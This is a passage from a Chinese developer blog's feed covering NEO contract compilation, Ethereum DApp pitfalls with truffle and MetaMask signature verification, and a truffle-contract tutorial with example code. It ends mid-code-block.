<p>ps.当配置完环境后，c#开发智能合约利用官网的插件，是会在vs2017内直接编译成<code>.dll文件</code>，再调用neon命令直接转化为<code>avm文件</code></p>
</blockquote>
<p>在自己尝试后，发现只要把生成的几个dll文件（一般是两个，一个自己的<code>xxx.dll</code>，一个<code>Neo.SmartContract.Framework.dll</code>)，移动到neon文件夹的目录下用命令<code>./neno.exe xxx.dll</code>,就可以成功转换</p>
<p>就是目录下找不到一些所用的文件，但是此处只把<code>mscorlib.dll</code>的文件拷贝到<code>xxx.dll</code>同目录下也是不行的。可能他还依赖其他一些文件。找到替代方法，也没有继续研究了。</p>
]]></content>
      
        
        <tags>
            
            <tag> NEO </tag>
            
            <tag> 区块链 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[DAPP开发中趟过的坑]]></title>
      <url>/2018/08/07/DAPP%E5%BC%80%E5%8F%91%E4%B8%AD%E8%B6%9F%E8%BF%87%E7%9A%84%E5%9D%91/</url>
      <content type="html"><![CDATA[<p>— 用时间砸出来的经验之谈 —<br>— 记录下来、造福后Zi人Ji —<br><a id="more"></a></p>
<h1 id="issue-amp-answer"><a href="#issue-amp-answer" class="headerlink" title="issue &amp; answer"></a>issue &amp; answer</h1><h2 id="TestRPC-Runtime-Error-out-of-gas"><a href="#TestRPC-Runtime-Error-out-of-gas" class="headerlink" title="TestRPC Runtime Error: out of gas"></a>TestRPC Runtime Error: out of gas</h2><p>解决：<a href="https://blog.csdn.net/loy_184548/article/details/78070279" target="_blank" rel="external">别人的博客</a></p>
<h2 id="truffle-serve-——-fsevents-is-not-a-constructor"><a href="#truffle-serve-——-fsevents-is-not-a-constructor" class="headerlink" title="truffle serve ——  fsevents is not a constructor"></a>truffle serve ——  fsevents is not a constructor</h2><p>解决：<a href="https://github.com/trufflesuite/truffle/issues/448" target="_blank" rel="external">万能的Github</a></p>
<h2 id="windows-cmd-运行truffle命令与truffle-js冲突"><a href="#windows-cmd-运行truffle命令与truffle-js冲突" class="headerlink" title="windows cmd 运行truffle命令与truffle.js冲突"></a>windows cmd 运行truffle命令与truffle.js冲突</h2><p>放弃windows <code>cmd</code>，乱七八糟问题多，用 <code>git bash</code></p>
<h2 id="truffle-contract-链接-web3-1-0版本"><a href="#truffle-contract-链接-web3-1-0版本" class="headerlink" title="truffle-contract 链接 web3 1.0版本"></a>truffle-contract 链接 web3 1.0版本</h2><p>解决：<a href="https://github.com/trufflesuite/truffle-contract/issues/57" target="_blank" rel="external">万能的Github-1</a><br>解决：<a href="https://github.com/trufflesuite/truffle-contract/issues/56#issuecomment-331084530" target="_blank" rel="external">万能的Github-2</a></p>
<p>最终解决代码如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//dirty hack for web3@1.0.0 support for localhost testrpc, see https://github.com/trufflesuite/truffle-contract/issues/56#issuecomment-331084530</span></div><div class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> self.contract.currentProvider.sendAsync !== <span class="string">"function"</span>) &#123;</div><div class="line">    self.contract.currentProvider.sendAsync = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> self.contract.currentProvider.send.apply(</div><div class="line">        self.contract.currentProvider, <span class="built_in">arguments</span></div><div class="line">    );</div><div class="line">    &#125;;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="metamask签名-智能合约中-验证签名-的坑"><a href="#metamask签名-智能合约中-验证签名-的坑" class="headerlink" title="metamask签名 智能合约中 验证签名 的坑"></a>metamask签名 智能合约中 验证签名 的坑</h2><p><strong>metamask</strong>中的web3 的 <strong>web3.eth.sign</strong> 与 <strong>web3.personal.sign</strong> 两种签名方式用同一账户地址对于同一数据的签名结果是不同的（我也完全不知道为什么啊啊啊啊！）<br>然后<strong>智能合约</strong>中用<code>ecrecover</code>进行验证</p>
<p><code>web3.personal.sign(密文，签名地址，回调函数)</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">web3.personal.sign(<span class="string">"0x19cdf95a071009070a345dd7ffd30ee7f18eee008f4f5d49945c1e2328c53e9d"</span>,<span class="string">"0x18c61a12a369d91277ace3fd1c127a7f270d5d3b"</span>,<span class="built_in">console</span>.log)</div><div class="line"><span class="comment">//err + result</span></div><div class="line"><span class="comment">// null "0x1ed1a91cfb8fb0fe77d63f2f6fbf12f789bdcf88c11f8e4ffc023f2fd61e7c264b1c59a79668eb698902d0043b9a0a3ee16165d3d57dc0a29dde61de8e8e687d1b"</span></div></pre></td></tr></table></figure></p>
<p><code>web3.eth.sign(签名地址,密文，回调函数)</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">web3.eth.sign(<span class="string">"0x18c61a12a369d91277ace3fd1c127a7f270d5d3b"</span>,</div><div class="line"><span class="string">"0x19cdf95a071009070a345dd7ffd30ee7f18eee008f4f5d49945c1e2328c53e9d"</span>,<span class="built_in">console</span>.log)</div><div class="line"><span class="comment">//err + result</span></div><div class="line"><span class="comment">// null "0x541959986ccc60b5a5ba5bf90535b5e1d372972413306df4d67c6224f79e585e4ff598da3c700965a70ff204ded769b3261ff67214b2d4fa955ee3dbaad76a301b"</span></div></pre></td></tr></table></figure></p>
<p>js中进行分解signature<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> signature = req.query.signature.slice(<span class="number">2</span>,<span class="number">132</span>) <span class="comment">//去除0x</span></div><div class="line"><span class="keyword">var</span> r = <span class="string">"0x"</span>+signature.slice(<span class="number">0</span>,<span class="number">64</span>);</div><div class="line"><span class="keyword">var</span> s = <span class="string">"0x"</span>+signature.slice(<span class="number">64</span>,<span class="number">128</span>);</div><div class="line"><span class="keyword">var</span> v = <span class="built_in">parseInt</span>(signature.slice(<span class="number">128</span>,<span class="number">130</span>),<span class="number">16</span>);  <span class="comment">//转为int形式 ，此处产生的v 直接就为27或28</span></div></pre></td></tr></table></figure></p>
<p>智能合约中的<code>ecrecover</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//uint8 v, bytes32 r, bytes32 s</span></div><div class="line">address addr = ecrecover(hashOfMsg, v, r, s);</div></pre></td></tr></table></figure></p>
<blockquote>
<p>关键的来了！<br>智能合约中的<code>ecrecover</code>是识别metamask中的web3.eth.sign<br>而不识别web3.personal.sign!!!!!!!!!!!!<br>不识别的意思是验证时，结果不一样！</p>
</blockquote>
<p>结论：<strong>智能合约中的<code>ecrecover</code>是识别metamask中的web3.eth.sign</strong></p>
<h2 id="智能合约与JS中的sha256"><a href="#智能合约与JS中的sha256" class="headerlink" title="智能合约与JS中的sha256"></a>智能合约与JS中的sha256</h2><p>当在在智能合约中用到的<code>ecrecover(hashOfMsg, v, r, s)</code></p>
<p>智能合约中的<code>sha256(address)</code>。address是作为bytes进行sha256；<br>在js中的<code>sha256(&quot;0x123&quot;)</code>是作为字符串形式进行sha256。</p>
<p>两者的结果不同，如果需要相同，需要在js中修改<code>&quot;0x123&quot;</code>为bytes形式进行sha256</p>
<h2 id="truffle寻找合约地址"><a href="#truffle寻找合约地址" class="headerlink" title="truffle寻找合约地址"></a>truffle寻找合约地址</h2><p>如何在truffle中找到部署合约的合约地址？</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> Web3 = <span class="built_in">require</span>(<span class="string">'web3'</span>);</div><div class="line"><span class="keyword">var</span> contract = <span class="built_in">require</span>(<span class="string">'truffle-contract'</span>);</div><div class="line"><span class="comment">//引入合约 以及 配置</span></div><div class="line"><span class="keyword">var</span> ConContract = <span class="built_in">require</span>(<span class="string">'../../contracts/Coin.json'</span>);</div><div class="line"><span class="comment">//链接到以太坊节点</span></div><div class="line"><span class="keyword">var</span> web3 = <span class="keyword">new</span> Web3(<span class="keyword">new</span> Web3.providers.HttpProvider(<span class="string">'http://localhost:7545'</span>));</div><div class="line"><span class="keyword">const</span> Cont = &#123;</div><div class="line">    <span class="comment">//地址</span></div><div class="line">    contract: <span class="literal">null</span>,</div><div class="line">    <span class="comment">//合约</span></div><div class="line">    instance: <span class="literal">null</span>,</div><div class="line"></div><div class="line">    <span class="comment">//初始化链接到以太坊节点</span></div><div class="line">    init: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">let</span> self = <span class="keyword">this</span></div><div class="line"></div><div class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</div><div class="line">        self.contract = contract(ConContract)</div><div class="line">        self.contract.setProvider(web3.currentProvider)</div><div class="line">        self.contract.deployed().then(<span class="function"><span class="params">instance</span> =&gt;</span> &#123;</div><div class="line">            self.instance = instance</div><div class="line">            resolve()</div><div class="line">        &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</div><div class="line">            reject(err)</div><div class="line">        &#125;)</div><div class="line">        &#125;)</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="built_in">module</span>.exports = Cont;</div></pre></td></tr></table></figure>
<p>如此初始化合约，合约地址在<code>Cont.instance.address</code></p>
]]></content>
      
        
        <tags>
            
            <tag> 智能合约 </tag>
            
            <tag> DAPP </tag>
            
            <tag> 血泪教训 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Truffle-Contract中间件]]></title>
      <url>/2018/08/07/truffle_contact/</url>
      <content type="html"><![CDATA[<p>— Truffle-Contract安装&amp;使用 —<br>—     连接 MetaMask钱包    —<br><a id="more"></a></p>
<h1 id="truffle-contact"><a href="#truffle-contact" class="headerlink" title="truffle-contact"></a>truffle-contact</h1><p><strong>truffle-contact</strong> 是一个基于web3的链接网络中智能合约的JS中间组件，利用它可以方便调用合约<br><a href="https://github.com/trufflesuite/truffle-contract" target="_blank" rel="external">官方英文文档</a></p>
<h2 id="安装-引入"><a href="#安装-引入" class="headerlink" title="安装/引入"></a>安装/引入</h2><p>安装：<br><code>npm install truffle-contract</code><br><code>npm install web3</code><br>引入：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"./path/to/web3.min.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div><div class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"./dist/truffle-contract.min.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div></pre></td></tr></table></figure></p>
<h2 id="链接至合约"><a href="#链接至合约" class="headerlink" title="链接至合约"></a>链接至合约</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//1.新建一个web3驱动</span></div><div class="line"><span class="keyword">var</span> provider = <span class="keyword">new</span> Web3.providers.HttpProvider(<span class="string">"http://localhost:8545"</span>);</div><div class="line"><span class="comment">//2.引入truffle-contract包</span></div><div class="line"><span class="keyword">var</span> contract = <span class="built_in">require</span>(<span class="string">"truffle-contract"</span>);</div><div class="line"><span class="comment">//3.1.输入是一个被定义为truffle0contract-schema的JSON blob</span></div><div class="line"><span class="keyword">var</span> MyContract = contract(&#123;</div><div class="line">  abi: ...,</div><div class="line">  unlinked_binary: ...,</div><div class="line">  address: ..., <span class="comment">// optional</span></div><div class="line">  <span class="comment">// many more</span></div><div class="line">&#125;)</div><div class="line"><span class="comment">//3.2.当引入是js包时，默认名称为TruffleContract</span></div><div class="line"><span class="keyword">var</span> MyContract = TruffleContract(...);</div><div class="line"><span class="comment">//4.配置驱动链接至链</span></div><div class="line">MyContract.setProvider(provider);</div></pre></td></tr></table></figure>
<p>你能使用<code>MyContract</code>中的以下函数来连接至链：</p>
<ul>
<li><code>at()</code>：创建一个MyContract实例在特定的位置</li>
<li><code>deployed()</code>：创建一个MyContract实例在合约默认的位置</li>
<li><code>new()</code>：部署一个此智能合约的新版本到网络，获取这个新的合约实例</li>
</ul>
<h2 id="合约抽象类"><a href="#合约抽象类" class="headerlink" title="合约抽象类"></a>合约抽象类</h2><p>链接至链上合约，可以查看合约返给我们的<code>合约抽象类</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 注意用.then 使用回调函数</span></div><div class="line">MetaCoin.deployed().then(<span class="function"><span class="keyword">function</span>(<span class="params">instance</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(instance);</div><div class="line">&#125;);</div><div class="line"></div><div class="line"><span class="comment">// 输出</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// Contract</span></div><div class="line"><span class="comment">// - address: "0xa9f441a487754e6b27ba044a5a8eb2eec77f6b92"</span></div><div class="line"><span class="comment">// - allEvents: ()</span></div><div class="line"><span class="comment">// - getBalance: ()</span></div><div class="line"><span class="comment">// - getBalanceInEth: ()</span></div><div class="line"><span class="comment">// - sendCoin: ()</span></div><div class="line"><span class="comment">// ...</span></div></pre></td></tr></table></figure></p>
<p>这里会有部署合约的地址，合约的函数等等内容，可以由此来调用合约中的函数</p>
<h2 id="truffle-contract-API"><a href="#truffle-contract-API" class="headerlink" title="truffle-contract API"></a>truffle-contract API</h2><p>在说明如何调用合约之前，以<code>MyContract</code>为例，详细说明truffle-contract自带的其他函数</p>
<h3 id="MyContract-new-arg1-arg2-…-tx-params"><a href="#MyContract-new-arg1-arg2-…-tx-params" class="headerlink" title="MyContract.new([arg1, arg2, …], [tx params])"></a>MyContract.new([arg1, arg2, …], [tx params])</h3><p><strong>作用</strong>：将合约的一个新实例部署到网络中<br><strong>输入参数</strong>：这个函数接受contract需要的任何参数。最后有一个可选参数，可传递交易参数，包括发起地址，gas限制，gas价格等。<br><strong>返回</strong>：返回包含一个在新的地址部署的合约 的合约抽象类 的Promise</p>
<h3 id="MyContract-at-address"><a href="#MyContract-at-address" class="headerlink" title="MyContract.at(address)"></a>MyContract.at(address)</h3><p><strong>作用</strong>：从链上特定的地址上创建一个新的合约实例<br><strong>输入参数</strong>：一个新的地址<br><strong>返回</strong>：返回一个新的合约实例</p>
<h3 id="MyContract-deployed"><a href="#MyContract-deployed" class="headerlink" title="MyContract.deployed()"></a>MyContract.deployed()</h3><p><strong>作用</strong>：从默认地址创建一个新的合约实例。该默认地址是提供给truffle-contract的参数，对应对应的链<br><strong>输入参数</strong>：一个新的地址<br><strong>返回</strong>：返回一个新的合约实例</p>
<h3 id="MyContract-link-instance"><a href="#MyContract-link-instance" class="headerlink" title="MyContract.link(instance)"></a>MyContract.link(instance)</h3><p><strong>作用</strong>：连接一个合约虚拟实例的库到MyContract。库必须已经被部署，并拥有部署地址。并且可以从该合约虚拟实例中推断出名称跟部署地址<br><strong>输入参数</strong>：一个已经部署的合约虚拟实例<br><strong>返回</strong>：在这个交易的结果中，报告所有合约虚拟实例库的事件？</p>
<p><code>MyContract.link(name, address)</code></p>
<p><code>MyContract.link(object)</code></p>
<blockquote>
<p>此处不太明白link的作用，差不多是拷贝吧，当用到时，再补充说明</p>
</blockquote>
<h3 id="MyContract-networks"><a href="#MyContract-networks" class="headerlink" title="MyContract.networks()"></a>MyContract.networks()</h3><p><strong>作用</strong>：查看MyContract的已经设置为代表的网络id列表<br><strong>返回</strong>：网络id列表</p>
<h3 id="MyContract-setProvider-provider"><a href="#MyContract-setProvider-provider" class="headerlink" title="MyContract.setProvider(provider)"></a>MyContract.setProvider(provider)</h3><p><strong>作用</strong>：设置MyContract将要使用的web3驱动<br><strong>输入参数</strong>：web3的provider</p>
<h3 id="MyContract-setNetwork-network-id"><a href="#MyContract-setNetwork-network-id" class="headerlink" title="MyContract.setNetwork(network_id)"></a>MyContract.setNetwork(network_id)</h3><p><strong>作用</strong>：设置MyContract当前代表网络id<br><strong>输入参数</strong>：网络id</p>
<h3 id="MyContract-hasNetwork-network-id"><a href="#MyContract-hasNetwork-network-id" class="headerlink" title="MyContract.hasNetwork(network_id)"></a>MyContract.hasNetwork(network_id)</h3><p><strong>作用</strong>：判断MyContract是否连接上这个网络<br><strong>输入参数</strong>：网络id<br><strong>返回</strong>：返回布尔型；是/否</p>
<h3 id="MyContract-defaults-new-defaults"><a href="#MyContract-defaults-new-defaults" class="headerlink" title="MyContract.defaults([new_defaults])"></a>MyContract.defaults([new_defaults])</h3><p><strong>作用</strong>：为从MyContract创建的所有实例设置事务默认值<br><strong>输入参数</strong>：设置的默认值<br><strong>返回</strong>：没有输入参数时，返回当前事务默认值<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//设置新的默认值</span></div><div class="line">MyContract.defaults(&#123;</div><div class="line">  <span class="keyword">from</span>: ...,</div><div class="line">  gas: ...,</div><div class="line">  gasPrice: ...,</div><div class="line">  value: ...</div><div class="line">&#125;)</div></pre></td></tr></table></figure></p>
<blockquote>
<p>此处设置可以省略在调用智能合约时的每次指定from，gas等</p>
</blockquote>
<h3 id="MyContract-clone-network-id"><a href="#MyContract-clone-network-id" class="headerlink" title="MyContract.clone(network_id)"></a>MyContract.clone(network_id)</h3><p><strong>作用</strong>：从当前MyContract克隆一个合约虚拟实例到新的网络id（别忘了，之后指定新的provider）<br><strong>输入参数</strong>：network_id<br><strong>返回</strong>：一个新的合约虚拟实例<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> MyOtherContract = MyContract.clone(<span class="number">1337</span>);</div></pre></td></tr></table></figure></p>
<h2 id="与合约中函数的交互"><a href="#与合约中函数的交互" class="headerlink" title="与合约中函数的交互"></a>与合约中函数的交互</h2><p>其中与合约函数交互有两种形式：<code>transaction</code> 和 <code>call</code><br>以下为实例合约<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</div><div class="line"> </div><div class="line"><span class="keyword">import</span> <span class="string">"./ConvertLib.sol"</span>;</div><div class="line"> </div><div class="line"><span class="comment">// This is just a simple example of a coin-like contract.</span></div><div class="line"><span class="comment">// It is not standards compatible and cannot be expected to talk to other</span></div><div class="line"><span class="comment">// coin/token contracts. If you want to create a standards-compliant</span></div><div class="line"><span class="comment">// token, see: https://github.com/ConsenSys/Tokens. Cheers!</span></div><div class="line"> </div><div class="line">contract MetaCoin &#123;</div><div class="line">  <span class="comment">//映射</span></div><div class="line">	mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint) balances;</div><div class="line">  <span class="comment">//转账事件</span></div><div class="line">	event Transfer(address indexed _from, address indexed _to, uint256 _value);</div><div class="line">  <span class="comment">//控制器，创建合约时运行</span></div><div class="line">	<span class="keyword">constructor</span>() public &#123;</div><div class="line">		balances[tx.origin] = <span class="number">10000</span>;</div><div class="line">	&#125;</div><div class="line">  <span class="comment">//代币转账函数</span></div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">sendCoin</span>(<span class="params">address receiver, uint amount</span>) <span class="title">public</span> <span class="title">returns</span>(<span class="params">bool sufficient</span>) </span>&#123;</div><div class="line">		<span class="keyword">if</span> (balances[msg.sender] &lt; amount) <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">		balances[msg.sender] -= amount;</div><div class="line">		balances[receiver] += amount;</div><div class="line">		emit Transfer(msg.sender, receiver, amount);</div><div class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">	&#125;</div><div class="line">  <span class="comment">//获取账户以太币函数</span></div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getBalanceInEth</span>(<span class="params">address addr</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span>(<span class="params">uint</span>)</span>&#123;</div><div class="line">		<span class="keyword">return</span> ConvertLib.convert(getBalance(addr),<span class="number">2</span>);</div><div class="line">	&#125;</div><div class="line">  <span class="comment">//获取代币函数</span></div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getBalance</span>(<span class="params">address addr</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span>(<span class="params">uint</span>) </span>&#123;</div><div class="line">		<span class="keyword">return</span> balances[addr];</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="transaction-交易"><a href="#transaction-交易" class="headerlink" title="transaction 交易"></a>transaction 交易</h3><p>真实的产生了一个交易，由矿工处理</p>
<ul>
<li>消耗Gas</li>
<li>改变网络状态</li>
<li>不能立即处理</li>
<li>不会有返回值(只会有交易id)</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> account_one = <span class="string">"0x1234..."</span>; <span class="comment">// an address</span></div><div class="line"><span class="keyword">var</span> account_two = <span class="string">"0xabcd..."</span>; <span class="comment">// another address</span></div><div class="line"></div><div class="line"><span class="keyword">var</span> meta;</div><div class="line"></div><div class="line">MetaCoin.deployed().then(<span class="function"><span class="keyword">function</span>(<span class="params">instance</span>) </span>&#123;</div><div class="line">  meta = instance;</div><div class="line">  <span class="keyword">return</span> meta.sendCoin(account_two, <span class="number">10</span>, &#123;<span class="attr">from</span>: account_one&#125;);</div><div class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</div><div class="line">  <span class="comment">// 如果这个回调函数被执行, 交易被成功执行了</span></div><div class="line">  alert(<span class="string">"Transaction successful!"</span>)</div><div class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</div><div class="line">  <span class="comment">// 有错误</span></div><div class="line">&#125;)</div></pre></td></tr></table></figure>
<blockquote>
<p>可以注意到实际我们传入了三个参数，但是在合约的定义中是没有第三个参数的。函数允许指定事务的细节，这里指定了from地址，确保交易是account_one发起的<br>　<br>如果在事务中执行的函数有一个返回值，那么您将不会在这个结果中获得返回值。您必须使用一个事件（event）并在日志数组中查找结果。之后详细说明</p>
</blockquote>
<h3 id="call"><a href="#call" class="headerlink" title="call"></a>call</h3><p>不会真实产生交易</p>
<ul>
<li>免费(不消耗Gas)</li>
<li>不改变网络状态</li>
<li>立即处理</li>
<li>会有返回值</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> account_one = <span class="string">"0x1234..."</span>; <span class="comment">// an address</span></div><div class="line"></div><div class="line"><span class="keyword">var</span> meta;</div><div class="line">MetaCoin.deployed().then(<span class="function"><span class="keyword">function</span>(<span class="params">instance</span>) </span>&#123;</div><div class="line">  meta = instance;</div><div class="line">  <span class="keyword">return</span> meta.getBalance.call(account_one, &#123;<span class="attr">from</span>: account_one&#125;);</div><div class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">balance</span>) </span>&#123;</div><div class="line">  <span class="comment">// 如果这个回调函数被执行, call被成功执行了</span></div><div class="line">  <span class="comment">// 注意：这个回调函数会立即返回，不会有等待</span></div><div class="line">  <span class="built_in">console</span>.log(balance.toNumber());</div><div class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</div><div class="line">  <span class="comment">// 有错误</span></div><div class="line">&#125;)</div></pre></td></tr></table></figure>
<blockquote>
<p>注意以太坊网络可以处理非常大的数字，这里返回是一个BigNumber类型，我们转变为数字（我们是已知这里的数字比较小，如果超出最大整型范围，转变会出错）</p>
</blockquote>
<h2 id="捕捉事件"><a href="#捕捉事件" class="headerlink" title="捕捉事件"></a>捕捉事件</h2><p>在合约中使用<code>event</code>触发事件，在 transaction 交易形式的返回内容中，会有事件结果（这也是让交易形式返回结果的方式）<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> account_one = <span class="string">"0x1234..."</span>; <span class="comment">// an address</span></div><div class="line"><span class="keyword">var</span> account_two = <span class="string">"0xabcd..."</span>; <span class="comment">// another address</span></div><div class="line"></div><div class="line"><span class="keyword">var</span> meta;</div><div class="line">MetaCoin.deployed().then(<span class="function"><span class="keyword">function</span>(<span class="params">instance</span>) </span>&#123;</div><div class="line">  meta = instance;  </div><div class="line">  <span class="keyword">return</span> meta.sendCoin(account_two, <span class="number">10</span>, &#123;<span class="attr">from</span>: account_one&#125;);</div><div class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</div><div class="line">  <span class="comment">// result 是一个对象 有以下参数</span></div><div class="line">  <span class="comment">//</span></div><div class="line">  <span class="comment">// result.tx      =&gt; 交易的hash, string型</span></div><div class="line">  <span class="comment">// result.logs    =&gt; 在交易中触发的事件的数组</span></div><div class="line">  <span class="comment">// result.receipt =&gt; 交易收据对象, 包括 gas used</span></div><div class="line"></div><div class="line">  <span class="comment">// 遍历 result.logs</span></div><div class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; result.logs.length; i++) &#123;</div><div class="line">    <span class="keyword">var</span> log = result.logs[i];</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (log.event == <span class="string">"Transfer"</span>) &#123;</div><div class="line">      <span class="comment">// 得到要的event</span></div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</div><div class="line">  <span class="comment">// 有错误</span></div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<h2 id="truffle-contract-链接Metamask-web3"><a href="#truffle-contract-链接Metamask-web3" class="headerlink" title="truffle-contract 链接Metamask web3"></a>truffle-contract 链接Metamask web3</h2><p>利用truffle-contract使MetaMask获取当前账号，连接至区块链<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div 